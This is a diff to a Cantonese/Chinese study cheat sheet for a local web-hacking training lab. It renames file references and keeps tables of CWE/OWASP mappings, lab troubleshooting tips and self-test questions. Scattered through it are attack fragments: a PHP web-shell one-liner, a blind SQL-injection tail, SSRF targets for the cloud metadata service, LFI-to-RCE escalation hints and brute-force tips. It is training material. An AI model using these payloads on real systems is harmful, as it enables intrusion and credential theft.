+| §14 功能／CWE／OWASP | `/services.php`、`/pdf.php`、`/imgproxy.php`／CWE-918／A10:2021 | ART_T3_07 §8.1 |
+| §14 metadata | `169.254.169.254`（AWS）、`metadata.google.internal`（GCP） | ART_T3_07 §8.1 |
+| §11 密碼長度／重建值 | 9 字元（3 數字＋3 字母＋3 Shift 符號）／`123qwe!@#` | ART_T3_08 §8.1 |
+| §11 特權判別 | `/etc/passwd` UID 0，例 `root:x:0:0:root:/root:/bin/bash` | ART_T3_08 §8.1 |
+| §11 MITRE／OWASP | TA0004／A07:2021 | ART_T3_08 §8.1 |
 
 ---
 
@@ -324,20 +324,20 @@
 
 | § | 漏洞 | CWE | OWASP 2021 | 收錄檔 |
 |---|---|---|---|---|
-| §1 | CAPTCHA Bypass | CWE-602（Client-Side Enforcement of Server-Side Security）、CWE-603（Use of Client-Side Authentication） | A08:2021（Software and Data Integrity Failures） | P2A |
-| §2 | Email Bomb | （安全配置錯誤，原文未編 CWE） | A05:2021（Security Misconfiguration）、A07:2021 | P2A |
-| §3 | Admin Privilege Escalation (Hidden Endpoint) | CWE-285（Improper Authorization）、CWE-639（Authorization Bypass Through User-Controlled Key / IDOR-BOLA）、CWE-434（Unrestricted Upload of File with Dangerous Type） | A01:2021（Broken Access Control）、A04:2021（Insecure Design） | P3 |
-| §4 | SQL Injection in a JSON Object | CWE-89（Improper Neutralization of Special Elements used in SQL） | A03:2021（Injection） | P2B |
-| §5 | Web Cache Poisoning | （unkeyed input，原文未編 CWE） | A05:2021（Security Misconfiguration） | P5 |
-| §6 | Unlimited Brute Force | CWE-307（Improper Restriction of Excessive Authentication Attempts） | A07:2021（Identification and Authentication Failures） | P2A |
-| §7 | Reflected XSS via HTTP Header | CWE-79（Improper Neutralization of Input During Web Page Generation） | A03:2021（Injection） | P5 |
-| §8 | OSINT / Username Leakage | （洩露內部識別碼） | A01:2021、A07:2021 | P1 |
-| §9 | Backup File Brute Force | CWE-530（Exposure of Backup File to an Unauthorized Control Sphere） | A05:2021（Security Misconfiguration） | P4 |
-| §10 | LFI via Language Loader | CWE-22（Improper Limitation of a Pathname to a Restricted Directory） | A01:2021（Broken Access Control） | P5 |
-| §11 | Host Privilege Escalation via Internal Hints | （弱可預測憑證） | A07:2021（Identification and Authentication Failures） | P6 |
-| §12 | NoSQL Injection via JSON Wildcard | CWE-943（Improper Neutralization of Special Elements in Data Query Logic） | A03:2021（Injection） | P2B |
-| §13 | OAuth / SSO Misconfiguration | CWE-346（Origin Validation Error） | A07:2021 + OWASP API2（Broken Authentication） | P2B |
-| §14 | Server-Side Request Forgery (SSRF) | CWE-918（Server-Side Request Forgery） | A10:2021（SSRF） | P5 |
+| §1 | CAPTCHA Bypass | CWE-602（Client-Side Enforcement of Server-Side Security）、CWE-603（Use of Client-Side Authentication） | A08:2021（Software and Data Integrity Failures） | ART_T3_03 |
+| §2 | Email Bomb | （安全配置錯誤，原文未編 CWE） | A05:2021（Security Misconfiguration）、A07:2021 | ART_T3_03 |
+| §3 | Admin Privilege Escalation (Hidden Endpoint) | CWE-285（Improper Authorization）、CWE-639（Authorization Bypass Through User-Controlled Key / IDOR-BOLA）、CWE-434（Unrestricted Upload of File with Dangerous Type） | A01:2021（Broken Access Control）、A04:2021（Insecure Design） | ART_T3_05 |
+| §4 | SQL Injection in a JSON Object | CWE-89（Improper Neutralization of Special Elements used in SQL） | A03:2021（Injection） | ART_T3_04 |
+| §5 | Web Cache Poisoning | （unkeyed input，原文未編 CWE） | A05:2021（Security Misconfiguration） | ART_T3_07 |
+| §6 | Unlimited Brute Force | CWE-307（Improper Restriction of Excessive Authentication Attempts） | A07:2021（Identification and Authentication Failures） | ART_T3_03 |
+| §7 | Reflected XSS via HTTP Header | CWE-79（Improper Neutralization of Input During Web Page Generation） | A03:2021（Injection） | ART_T3_07 |
+| §8 | OSINT / Username Leakage | （洩露內部識別碼） | A01:2021、A07:2021 | ART_T3_02 |
+| §9 | Backup File Brute Force | CWE-530（Exposure of Backup File to an Unauthorized Control Sphere） | A05:2021（Security Misconfiguration） | ART_T3_06 |
+| §10 | LFI via Language Loader | CWE-22（Improper Limitation of a Pathname to a Restricted Directory） | A01:2021（Broken Access Control） | ART_T3_07 |
+| §11 | Host Privilege Escalation via Internal Hints | （弱可預測憑證） | A07:2021（Identification and Authentication Failures） | ART_T3_08 |
+| §12 | NoSQL Injection via JSON Wildcard | CWE-943（Improper Neutralization of Special Elements in Data Query Logic） | A03:2021（Injection） | ART_T3_04 |
+| §13 | OAuth / SSO Misconfiguration | CWE-346（Origin Validation Error） | A07:2021 + OWASP API2（Broken Authentication） | ART_T3_04 |
+| §14 | Server-Side Request Forgery (SSRF) | CWE-918（Server-Side Request Forgery） | A10:2021（SSRF） | ART_T3_07 |
 
 **MITRE ATT&CK 對照**
 
@@ -355,7 +355,7 @@
 
 > 上半部係原文／筆記提及嘅 error 同卡點；下半部係「新手排查步驟」（本速記整理）。
 
-### 4.1 環境／代理類（Stage 0，`ART_T3_00`）
+### 4.1 環境／代理類（Stage 0，`ART_T3_01`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -368,7 +368,7 @@
 
 **新手排查步驟（環境）**：① 靶場有無 `PHP 8.x Development Server … started`？② FoxyProxy 有無剔 Burp？③ Burp listener 是否 `127.0.0.1:8080` Running？④ `http://burpsuite` 收唔收到 CA 頁？⑤ CA 有無出現在 Authorities 並已信任？
 
-### 4.2 偵察／命令類（§8，`ART_T3_P1`）
+### 4.2 偵察／命令類（§8，`ART_T3_02`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -377,7 +377,7 @@
 | 打開 `/api/users.php` 見 HTML 登入頁／302 | 環境未起好、路徑錯、host/port 錯 | 用 `http://localhost:8080`；確認 VM 起咗、port 8080 有聽 |
 | `python3 tools/brute.py` 冇反應／報錯 | 唔喺 lab root 執行 | 一定要喺 lab folder 執行（腳本用相對路徑） |
 
-### 4.3 認證／自動化濫用類（§1／§2／§6，`ART_T3_P2A`）
+### 4.3 認證／自動化濫用類（§1／§2／§6，`ART_T3_03`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -392,7 +392,7 @@
 | 唔知 Intruder attack type | 兩個 payload 位置 | 用 **Cluster bomb**（單位置才用 Sniper） |
 | 點睇結果邊行成功 | 只看 200 會錯 | 成功係 **302（轉去 `/index.php`）且長度唔同**；用 length 欄 sort |
 
-### 4.4 注入類（§4／§12／§13，`ART_T3_P2B`）
+### 4.4 注入類（§4／§12／§13，`ART_T3_04`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -402,7 +402,7 @@
 | Blind 版本變語法錯 | 引號數目唔平衡 | `OR '1'='1` 結尾**故意唔封最後引號**，等程式收尾；數清有幾個 `'` |
 | sqlmap 撞唔入 | 注入點非標準＋自訂 filter＋統一 401 | 改用手工布林式 blind，讀 200 vs 401 差異，逐位 `substr()` 抽取 |
 
-### 4.5 權限提升／憑證蒐集類（§3／§9，`ART_T3_P3`、`ART_T3_P4`）
+### 4.5 權限提升／憑證蒐集類（§3／§9，`ART_T3_05`、`ART_T3_06`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -412,7 +412,7 @@
 | 撞到 `.php.bak` 但瀏覽器空白 | 打漏咗 `.bak`，畀 PHP 執行 | 確認 URL 真係帶 `.bak`／`~` |
 | 撞到 302 以為失敗 | 未登入時 302 = 路徑存在 | 用 302 vs 404 判斷存在；再用 leak＋JS 交叉比對用途 |
 
-### 4.6 橫向檔案存取類（§5／§7／§10／§14，`ART_T3_P5`）
+### 4.6 橫向檔案存取類（§5／§7／§10／§14，`ART_T3_07`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -421,7 +421,7 @@
 | `@file_get_contents()` 以為個 `@` 係防護 | 誤解運算子 | `@` 只抑制 PHP warning，**唔阻止任何嘢**，唔係防護 |
 | LFI 讀得到但唔知點升 RCE | 忽略 `include` 會執行 PHP | `include()` 會執行載入檔內 PHP；可上傳／session／log poisoning 升級 |
 
-### 4.7 主機淪陷類（§11，`ART_T3_P6`）
+### 4.7 主機淪陷類（§11，`ART_T3_08`）
 
 | 卡點／Error | 成因 | Fix |
 |---|---|---|
@@ -503,64 +503,64 @@
 
 > 每題單行問句；答案指向對應 guide 檔名＋節號。原教程共 53 條 student questions，以下壓縮／篩選成 38 條高頻考點。
 
-**公開偵察（`ART_T3_P1`）**
+**公開偵察（`ART_T3_02`）**
 
-1. OSINT 點解對攻擊者合法、低風險、又高槓桿？→ P1 §4.1
-2. 公開員工名錄點樣「halve the attacker's work」？連到 spraying／stuffing／phishing → P1 §4.2
-3. Stealer log 行格式係咩？點抽 username:password？→ P1 §4.3
-4. 欄位移位陷阱為何輸出 `443:mary.wong`？→ P1 §4.6
-5. IDOR 為何單靠一個帳號 expose 唔到？要點做先見到？→ P1 §5
-6. OSINT 屬 MITRE 邊個 tactic？對應邊四個技術編號？→ P1 §8
+1. OSINT 點解對攻擊者合法、低風險、又高槓桿？→ ART_T3_02 §4.1
+2. 公開員工名錄點樣「halve the attacker's work」？連到 spraying／stuffing／phishing → ART_T3_02 §4.2
+3. Stealer log 行格式係咩？點抽 username:password？→ ART_T3_02 §4.3
+4. 欄位移位陷阱為何輸出 `443:mary.wong`？→ ART_T3_02 §4.6
+5. IDOR 為何單靠一個帳號 expose 唔到？要點做先見到？→ ART_T3_02 §5
+6. OSINT 屬 MITRE 邊個 tactic？對應邊四個技術編號？→ ART_T3_02 §8
 
-**認證與自動化濫用（`ART_T3_P2A`）**
+**認證與自動化濫用（`ART_T3_03`）**
 
-7. CAPTCHA 洩漏答案嘅兩個途徑係咩？→ P2A §1
-8. 為何「完全唔交 captcha 欄位」都註冊到？→ P2A §1
-9. Magic string backdoor 點用對照測試確認？→ P2A §1
-10. Email bomb 點用一個 request 觸發多封？→ P2A §2
-11. Delimiter injection 背後嘅錯誤假設係咩？→ P2A §2
-12. 為何綁 session cookie 嘅鎖定機制可以繞過？→ P2A §6
-13. 成功登入嗰行 Intruder 結果有咩特徵？→ P2A §6
-14. 明文／快 hash／慢 salted hash 存密碼分別喺邊？→ P2A §6
+7. CAPTCHA 洩漏答案嘅兩個途徑係咩？→ ART_T3_03 §1
+8. 為何「完全唔交 captcha 欄位」都註冊到？→ ART_T3_03 §1
+9. Magic string backdoor 點用對照測試確認？→ ART_T3_03 §1
+10. Email bomb 點用一個 request 觸發多封？→ ART_T3_03 §2
+11. Delimiter injection 背後嘅錯誤假設係咩？→ ART_T3_03 §2
+12. 為何綁 session cookie 嘅鎖定機制可以繞過？→ ART_T3_03 §6
+13. 成功登入嗰行 Intruder 結果有咩特徵？→ ART_T3_03 §6
+14. 明文／快 hash／慢 salted hash 存密碼分別喺邊？→ ART_T3_03 §6
 
-**注入與 SSO（`ART_T3_P2B`）**
+**注入與 SSO（`ART_T3_04`）**
 
-15. 為何送 JSON 唔會令 SQLi 消失？決定性因素係咩？→ P2B §4
-16. Blind SQLi 為何尾部用 `OR '1'='1` 而唔係 `--`？→ P2B §4
-17. Prepared statements 點中和 SQLi？為何黑名單／手動 escape 唔夠？→ P2B §4
-18. sqlmap 為何對呢類 endpoint 失效？人要點做？→ P2B §4
-19. NoSQL 同 SQLi 嘅共同根因係咩？→ P2B §12
-20. 邊啲 NoSQL payload shape 會回傳全表？為何？→ P2B §12
-21. OAuth redirect_uri allow-list 應保證咩？open redirect 點變 takeover？→ P2B §13
-22. Authorization code 做一次性＋短命嘅威脅模型係咩？→ P2B §13
-23. Token endpoint 兌換前要驗邊幾樣？→ P2B §13
-24. state 參數扮演咩角色？為何偷到 code 仲要新鮮 state？→ P2B §13
+15. 為何送 JSON 唔會令 SQLi 消失？決定性因素係咩？→ ART_T3_04 §4
+16. Blind SQLi 為何尾部用 `OR '1'='1` 而唔係 `--`？→ ART_T3_04 §4
+17. Prepared statements 點中和 SQLi？為何黑名單／手動 escape 唔夠？→ ART_T3_04 §4
+18. sqlmap 為何對呢類 endpoint 失效？人要點做？→ ART_T3_04 §4
+19. NoSQL 同 SQLi 嘅共同根因係咩？→ ART_T3_04 §12
+20. 邊啲 NoSQL payload shape 會回傳全表？為何？→ ART_T3_04 §12
+21. OAuth redirect_uri allow-list 應保證咩？open redirect 點變 takeover？→ ART_T3_04 §13
+22. Authorization code 做一次性＋短命嘅威脅模型係咩？→ ART_T3_04 §13
+23. Token endpoint 兌換前要驗邊幾樣？→ ART_T3_04 §13
+24. state 參數扮演咩角色？為何偷到 code 仲要新鮮 state？→ ART_T3_04 §13
 
-**權限提升（`ART_T3_P3`）**
+**權限提升（`ART_T3_05`）**
 
-25. IDOR 缺邊個 check？伺服器每次要驗乜？→ P3 §4.2
-26. 如何由 leak ＋ JS asset 樞到隱藏 admin endpoint？→ P3 §4.7
-27. 上載變成 RCE 要邊三個防禦同時失效？→ P3 §4.8
-28. 目錄掃描見 302 代表咩？唔代表咩？→ P3 §4.6
-29. `<?php echo system($_GET['cmd']); ?>` 兩部分分別做乜？→ P3 §8.2
+25. IDOR 缺邊個 check？伺服器每次要驗乜？→ ART_T3_05 §4.2
+26. 如何由 leak ＋ JS asset 樞到隱藏 admin endpoint？→ ART_T3_05 §4.7
+27. 上載變成 RCE 要邊三個防禦同時失效？→ ART_T3_05 §4.8
+28. 目錄掃描見 302 代表咩？唔代表咩？→ ART_T3_05 §4.6
+29. `<?php echo system($_GET['cmd']); ?>` 兩部分分別做乜？→ ART_T3_05 §8.2
 
-**憑證蒐集（`ART_T3_P4`）**
+**憑證蒐集（`ART_T3_06`）**
 
-30. 為何可預測備份檔名係最抵嘅發現？200 vs 404 判別作用？→ P4 §4.4
-31. 為何要先 fingerprint？被動訊號有邊啲？→ P4 §4.4
-32. 暴露 `.git` 比單一 config 備份值錢喺邊？→ P4 §4.10
-33. 為何「檔名難估」唔可以當 security control？→ P4 §4.12
+30. 為何可預測備份檔名係最抵嘅發現？200 vs 404 判別作用？→ ART_T3_06 §4.4
+31. 為何要先 fingerprint？被動訊號有邊啲？→ ART_T3_06 §4.4
+32. 暴露 `.git` 比單一 config 備份值錢喺邊？→ ART_T3_06 §4.10
+33. 為何「檔名難估」唔可以當 security control？→ ART_T3_06 §4.12
 
-**橫向檔案存取（`ART_T3_P5`）**
+**橫向檔案存取（`ART_T3_07`）**
 
-34. 定義 unkeyed input；邊啲 proxy header 有呢個特性？→ P5 §4.1
-35. Header 反射 XSS 為何前端表單驗證擋唔到？→ P5 §4.2
-36. LFI `../` 為何能逃逸？有咩 filter-evasion 技巧？→ P5 §4.3
-37. SSRF 為何繞過網路邊界？為何 `169.254.169.254` 最高價值？→ P5 §4.4
+34. 定義 unkeyed input；邊啲 proxy header 有呢個特性？→ ART_T3_07 §4.1
+35. Header 反射 XSS 為何前端表單驗證擋唔到？→ ART_T3_07 §4.2
+36. LFI `../` 為何能逃逸？有咩 filter-evasion 技巧？→ ART_T3_07 §4.3
+37. SSRF 為何繞過網路邊界？為何 `169.254.169.254` 最高價值？→ ART_T3_07 §4.4
 
-**主機淪陷（`ART_T3_P6`）**
+**主機淪陷（`ART_T3_08`）**
 
-38. Keyboard-walk 密碼為何滿足複雜度但極弱？由 LFI 到 root 嘅 kill chain 點行？→ P6 §4.2／§4.1
+38. Keyboard-walk 密碼為何滿足複雜度但極弱？由 LFI 到 root 嘅 kill chain 點行？→ ART_T3_08 §4.2／§4.1
 
 ---
 
@@ -607,4 +607,4 @@
 
 ---
 
-> **本檔完** — 涵蓋 Stage 0 ＋ 攻擊鏈六階段（§0–§14）累積速記：攻擊鏈總覽、逐節 payload、CWE／OWASP 對照、Error/Fix、英文必背句 40 條、自測 38 條、防守清單。詳細逐節解說見 `ART_T3_P1`～`ART_T3_P6` 各 Study Guide。
+> **本檔完** — 涵蓋 Stage 0 ＋ 攻擊鏈六階段（§0–§14）累積速記：攻擊鏈總覽、逐節 payload、CWE／OWASP 對照、Error/Fix、英文必背句 40 條、自測 38 條、防守清單。詳細逐節解說見 `ART_T3_02`～`ART_T3_08` 各 Study Guide。
